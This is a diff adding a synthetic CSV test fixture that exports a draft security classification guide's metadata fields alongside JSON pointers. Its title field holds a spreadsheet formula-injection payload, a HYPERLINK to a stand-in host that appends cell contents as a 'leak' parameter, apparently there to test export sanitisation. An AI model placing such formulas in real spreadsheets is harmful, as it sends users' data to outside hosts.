@@ -1,0 +1,60 @@
+UNCLASSIFIED — SYNTHETIC & TEST,,
+SYNTHETIC — DRAFT / NOT APPROVED,,
+Guide urn:uuid:5e1d0c3a-0000-4000-8000-00000000f0e1 · revision inject-1 · payload digest sha-256:ee1de4d9b959c736b6bc424bf200bad86d38c6fa624be98f1ad63e256e001bb6,,
+"GENERIC EXPORT — NOT A DTIC SUBMISSION. This workbook is a documented mapping of an OpenSCG guide, produced by an experimental Imprint spike. It has not been checked against any DoD or DTIC template and must not be described as meeting DoDM 5200.45 or any submission format. The OpenSCG JSON file is the authoritative copy; see the loss report for what this workbook does not carry. The digest shown identifies the signed JSON payload; it does not prove this workbook matches it.",,
+,,
+Field,Value,JSON pointer
+Payload digest algorithm,sha-256,(computed)
+Payload digest,ee1de4d9b959c736b6bc424bf200bad86d38c6fa624be98f1ad63e256e001bb6,(computed)
+OpenSCG specification implemented,0.1.0,(computed)
+Workbook mapping,imprint-xlsx-spike-1,(computed)
+Not carried in this workbook,Nothing (see the loss report),(loss report)
+Schema version,0.1.0,/schema_version
+Profile,cnsi-core,/profile
+Synthetic,true,/synthetic
+Guide ID,urn:uuid:5e1d0c3a-0000-4000-8000-00000000f0e1,/guide_id
+Revision ID,inject-1,/revision_id
+Title,"=HYPERLINK(""https://example.invalid/?leak=""&A1,""SYNTHETIC title injection"")",/title
+Subject,,/subject
+Scope,,/scope
+Issuing organization,,/issuing_organization/name
+Issuing organization identifier,,/issuing_organization/identifier
+Point of contact: name,,/point_of_contact/name
+Point of contact: position,,/point_of_contact/position
+Point of contact: organization,,/point_of_contact/organization
+Point of contact: email,,/point_of_contact/email
+Point of contact: phone,,/point_of_contact/phone
+OCA: name,,/oca/name
+OCA: position,,/oca/position
+OCA: personal identifier,,/oca/personal_identifier
+OCA: highest level (claimed),,/oca/highest_level
+Date issued,,/dates/issued
+Date last reviewed,,/dates/last_reviewed
+Date effective,,/dates/effective
+Next review due,,/dates/next_review_due
+Lifecycle state (recorded),draft,/lifecycle/state
+Lifecycle note,,/lifecycle/note
+Document classification,U,/document_markings/classification
+Document banner,UNCLASSIFIED — SYNTHETIC & TEST,/document_markings/banner
+Document controls (one per line),,/document_markings/controls
+Classified by,,/document_markings/classification_authority_block/classified_by
+Derived from,,/document_markings/classification_authority_block/derived_from
+Classification reason (document),,/document_markings/classification_authority_block/reason
+Declassify on (document),,/document_markings/classification_authority_block/declassify_on
+Markings review status,,/document_markings/review/status
+Markings reviewed by,,/document_markings/review/reviewed_by
+Markings reviewed on,,/document_markings/review/reviewed_on
+Introduction,,/introduction
+Claimed signer: name,,/authority/claimed_signer/name
+Claimed signer: position,,/authority/claimed_signer/position
+Claimed signer: personal identifier,,/authority/claimed_signer/personal_identifier
+Claimed delegation: highest level,,/authority/claimed_delegation/highest_level
+Claimed delegation: program,,/authority/claimed_delegation/program
+Claimed delegation evidence: kind,,/authority/claimed_delegation/evidence/kind
+Claimed delegation evidence: reference,,/authority/claimed_delegation/evidence/reference
+Claimed delegation evidence: date,,/authority/claimed_delegation/evidence/date
+Claimed delegation evidence: URI,,/authority/claimed_delegation/evidence/uri
+Authority review status,,/review/status
+Authority reviewed by,,/review/reviewed_by
+Authority reviewed on,,/review/reviewed_on
+Authority review notes,,/review/notes
